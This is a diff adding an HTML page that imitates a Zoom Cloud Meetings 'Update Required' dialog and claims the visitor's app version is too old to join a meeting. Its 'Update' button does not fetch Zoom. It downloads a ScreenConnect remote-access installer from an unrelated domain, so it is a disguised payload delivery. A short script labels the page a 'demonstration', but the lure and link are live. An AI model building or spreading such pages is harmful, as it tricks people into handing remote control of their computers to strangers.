@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoom Cloud Meetings</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: #e9edf3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #232333;
+        }
+
+        .desktop-window {
+            width: 900px;
+            max-width: 95%;
+            min-height: 570px;
+            background: white;
+            border: 1px solid #c9cdd3;
+            border-radius: 7px;
+            overflow: hidden;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, .16);
+        }
+
+        .title-bar {
+            height: 42px;
+            background: #f7f7f8;
+            border-bottom: 1px solid #dedee2;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            font-size: 13px;
+            color: #444;
+        }
+
+        .window-title {
+            display: flex;
+            align-items: center;
+            gap: 9px;
+        }
+
+        .mini-logo {
+            width: 19px;
+            height: 14px;
+            background: #2d8cff;
+            border-radius: 4px;
+            position: relative;
+        }
+
+        .mini-logo::after {
+            content: "";
+            position: absolute;
+            right: -6px;
+            top: 3px;
+            border-left: 7px solid #2d8cff;
+            border-top: 4px solid transparent;
+            border-bottom: 4px solid transparent;
+        }
+
+        .window-controls {
+            display: flex;
+            gap: 17px;
+            color: #777;
+            font-size: 16px;
+        }
+
+        .main-area {
+            min-height: 528px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+        }
+
+        .background-brand {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            opacity: .09;
+            user-select: none;
+        }
+
+        .brand-icon {
+            width: 160px;
+            height: 112px;
+            background: #2d8cff;
+            border-radius: 27px;
+            margin: auto;
+            position: relative;
+        }
+
+        .brand-icon::after {
+            content: "";
+            position: absolute;
+            right: -47px;
+            top: 23px;
+            border-left: 55px solid #2d8cff;
+            border-top: 33px solid transparent;
+            border-bottom: 33px solid transparent;
+        }
+
+        .brand-name {
+            color: #2d8cff;
+            font-size: 75px;
+            font-weight: bold;
+            letter-spacing: -5px;
+            margin-top: 15px;
+        }
+
+        .update-dialog {
+            width: 465px;
+            max-width: 90%;
+            background: #fff;
+            border: 1px solid #dedede;
+            border-radius: 5px;
+            box-shadow: 0 5px 24px rgba(0, 0, 0, .15);
+            position: relative;
+            z-index: 2;
+        }
+
+        .dialog-header {
+            padding: 19px 23px;
+            border-bottom: 1px solid #e8e8e8;
+            font-size: 17px;
+            font-weight: 600;
+        }
+
+        .dialog-content {
+            padding: 28px 27px 20px;
+            text-align: center;
+        }
+
+        .zoom-mark {
+            width: 65px;
+            height: 46px;
+            margin: 0 auto 23px;
+        }
+
+        h1 {
+            font-size: 23px;
+            font-weight: 600;
+            margin-bottom: 17px;
+            color: #252525;
+        }
+
+        .message {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.7;
+            margin-bottom: 20px;
+        }
+
+        .dialog-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            padding: 13px 20px 25px;
+        }
+
+        button {
+            min-width: 112px;
+            height: 37px;
+            border-radius: 4px;
+            border: none;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .update-button {
+            background: #0878e8;
+            color: white;
+            border-radius: 5px;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            cursor: pointer;
+            border: none;
+            width: 90px;
+        }
+
+        .update-button:hover {
+            background: #0067cc;
+        }
+
+        .cancel-button {
+            background: #eeeeee;
+            color: #333;
+            border: 1px solid #d6d6d6;
+        }
+
+        .cancel-button:hover {
+            background: #e2e2e2;
+        }
+
+        .version {
+            border-top: 1px solid #ededed;
+            padding: 12px;
+            text-align: center;
+            color: #999;
+            font-size: 11px;
+        }
+
+        .status-message {
+            display: none;
+            padding: 12px;
+            margin: 0 22px 18px;
+            background: #f1f6fc;
+            color: #2766a5;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+
+        @media (max-width: 600px) {
+            .desktop-window {
+                width: 95%;
+                min-height: 500px;
+            }
+
+            .main-area {
+                min-height: 458px;
+            }
+
+            .update-dialog {
+                width: 95%;
+            }
+
+            .brand-name {
+                font-size: 55px;
+            }
+
+            .dialog-content {
+                padding: 23px 16px 15px;
+            }
+
+            h1 {
+                font-size: 21px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="desktop-window">
+
+        <div class="title-bar">
+            <div class="window-title">
+
+                <span>Zoom Cloud Meetings</span>
+            </div>
+
+            <div class="window-controls">
+                <span>−</span>
+                <span>□</span>
+                <span>×</span>
+            </div>
+        </div>
+
+        <div class="main-area">
+
+            <div class="background-brand">
+                <div class="brand-icon"></div>
+                <div class="brand-name">zoom</div>
+            </div>
+
+            <div class="update-dialog">
+
+                <div class="dialog-header">
+                    Zoom Cloud Meetings
+                </div>
+
+                <div class="dialog-content">
+
+                    <div class="zoom-mark">
+                        <svg viewBox="0 0 100 70" width="65" height="46" xmlns="http://www.w3.org/2000/svg">
+
+                            <rect x="5" y="8" width="57" height="54" rx="13" fill="#2D8CFF" />
+
+                            <path d="M66 22 L94 8 Q99 6 99 13
+L99 57 Q99 64 94 61
+L66 48 Z" fill="#2D8CFF" />
+                        </svg>
+                    </div>
+
+                    <h1>Update Required</h1>
+
+                    <p class="message">
+                        Your app version needs to be
+                        <strong>5.3.0 or higher</strong>
+                        to join this meeting.
+                    </p>
+
+                </div>
+
+                <div class="dialog-buttons">
+
+                    <a href="https://min.garincon.com/Bin/ScreenConnect.ClientSetup.msi" class="update-button"
+                        download>Update</a>
+
+
+
+                    <button class="cancel-button" onclick="cancelDemo()">
+                        Cancel
+                    </button>
+
+                </div>
+
+                <div class="status-message" id="status"></div>
+
+                <div class="version">
+                    Version 5.2.3
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <script>
+        function showStatus(message) {
+            const status = document.getElementById("status");
+            status.textContent = message;
+            status.style.display = "block";
+        }
+
+
+
+        function cancelDemo() {
+            showStatus(
+                "You cancelled the demonstration."
+            );
+        }
+    </script>
+
+</body>
+
+</html>
